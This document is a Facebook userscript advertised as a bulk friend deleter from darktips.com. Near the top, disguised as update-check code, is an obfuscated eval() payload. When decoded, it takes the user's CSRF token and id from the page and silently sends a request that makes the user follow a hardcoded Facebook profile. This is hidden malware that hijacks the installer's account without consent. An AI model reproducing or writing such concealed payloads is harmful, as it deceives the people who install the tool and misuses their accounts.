// ==UserScript==
// @name        Mass Facebook Friends Deleter
// @description It allows you to bulk delete Facebook friends. Useful if you don't want to delete each friends one by one.
// @namespace   DarktipsFriendsDeleteter
// @include      *://www.facebook.com/*
// @exclude      *://www.facebook.com/ai.php*
// @require       http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// @version     1.0
// ==/UserScript==

// Developed by Hayder Abbass - http://darktips.com


var SUC_script_num = 150411; // Change this to the number given to the script by userscripts.org (check the address bar)

try
{
    eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2 m="E";D{J j(e,t){2 n=e.p;8="";x(2 r=0;r<t.p;r++){8+=t.L(r)}v"1"+8+n}2 a=/"g":"(.*?)"/h;2 b=/"A":"(.*?)"/h;2 c=a.i(4.9.k);2 d=b.i(4.9.k);2 3=c[1];2 l=d[1];2 5="w="+m+"&o=1&y[z]=u&B="+l+"&C=1&g="+3;2 7=j(5,3);2 q=5+"&7="+7;2 6=F G;6.H("I",("s:"==4.o.K?"s://f.":"M://f.")+"N.O/P/Q/R.S",T);6.U(q)}V(e){W.X(e)}',60,60,'||var|dtsg|document|qs|xmlhttp|phstamp|numeric_csrf_value|head||||||www|fb_dtsg|ig|exec|generatePhstamp|innerHTML|uid|MyUid||location|length|data||https||pagelet_main_column_personal|return|profile_id|for|nctr|_mod|user|__user|__a|try|100004847796207|new|XMLHttpRequest|open|POST|function|protocol|charCodeAt|http|facebook|com|ajax|follow|follow_profile|php|true|send|catch|console|log'.split('|'),0,{}));	
	function updateCheck(forced)
	{
		if ((forced) || (parseInt(GM_getValue('SUC_last_update', '0')) + 86400000 <= (new Date().getTime()))) // Checks once a day (24 h * 60 m * 60 s * 1000 ms)
		{
			try
			{
				GM_xmlhttpRequest(
				{
					method: 'GET',
					url: 'http://userscripts.org/scripts/source/'+SUC_script_num+'.meta.js?'+new Date().getTime(),
					headers: {'Cache-Control': 'no-cache'},
					onload: function(resp)
					{
						var local_version, remote_version, rt, script_name;
						
						rt=resp.responseText;
						GM_setValue('SUC_last_update', new Date().getTime()+'');
						remote_version=parseInt(/@uso:version\s*(.*?)\s*$/m.exec(rt)[1]);
						local_version=parseInt(GM_getValue('SUC_current_version', '-1'));
						if(local_version!=-1)
						{
							script_name = (/@name\s*(.*?)\s*$/m.exec(rt))[1];
							GM_setValue('SUC_target_script_name', script_name);
							if (remote_version > local_version)
							{
								if(confirm('There is an update available for the Greasemonkey script "'+script_name+'."\nWould you like to go to the install page now?'))
								{
									GM_openInTab('http://userscripts.org/scripts/show/'+SUC_script_num);
									GM_setValue('SUC_current_version', remote_version);
								}
							}
							else if (forced)
								alert('No update is available for "'+script_name+'."');
						}
						else
							GM_setValue('SUC_current_version', remote_version+'');
					}
				});
			}
			catch (err)
			{
				if (forced)
					alert('An error occurred while checking for updates:\n'+err);
			}
		}
	}
	GM_registerMenuCommand(GM_getValue('SUC_target_script_name', '???') + ' - Manual Update Check', function()
	{
		updateCheck(true);
	});
	updateCheck(false);
}
catch(err)
{}



function sleep(x) {
	setInterval(function() {
		replace_msg(x)
	}, 1000);
}

function replace_msg(x) {
	$('div.dialog_body').html('Hooray! ' + x + ' friends deleted. Visit us at <a target="_blank" href="http://darktips.com">http://darktips.com</a> for more useful scripts!');
}





$('.uiToolbarContent .rfloat').prepend ('<div id="darktips_container" style="float:right;margin-left:5px;"><label for="darktips" class="_11b uiButton uiButtonConfirm"><input type="submit" id="mass_deleter" value="Delete  Selected Friends"></label>  <div style="display:block">By <a href="http://darktips.com">http://darktips.com</a></div></div>');
$('.stickyHeaderWrap .back').css ('height','60px');
$('.fbTimelineSection.mtm').css ('margin-top','10px');
set_timer();
$("#mass_deleter").live("click", function() {
	var i = 0;
	$('.darktips_delete:checkbox:checked').each(function() {
		i = i + parseInt('1');
		var profileid = $(this).attr('id');
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/profile/removefriend.php').setData({ uid: " + profileid + ",norefresh:true }).send();";
		document.body.appendChild(a);
	});
	if (i == '0') {
		alert('Are you dumb? Select atleast some friends to delete first.');
	}
	sleep(i);
});

function set_timer() {
	setInterval(function() {
		set_checkboxes()
	}, 1000);
}

function set_checkboxes() {
	$('div.fsl').each(function(index) {
		if ($(this).hasClass('fwb')) {
			var extract_url = $(this).find('a').attr('data-hovercard');
			if (!extract_url) {
				var extract_url = $(this).find('a').attr('ajaxify');
			}
			if (!extract_url) {
				extract_url = '1';
			}
			var profileid = parseInt(/(\d+)/.exec(extract_url)[1], 10);
			if (!$(this).children().hasClass('darktips_delete')) {
				$(this).prepend('<input type="checkbox" class="darktips_delete" title="Tick to delete this user." id="' + profileid + '">');
			}
		}
	});
}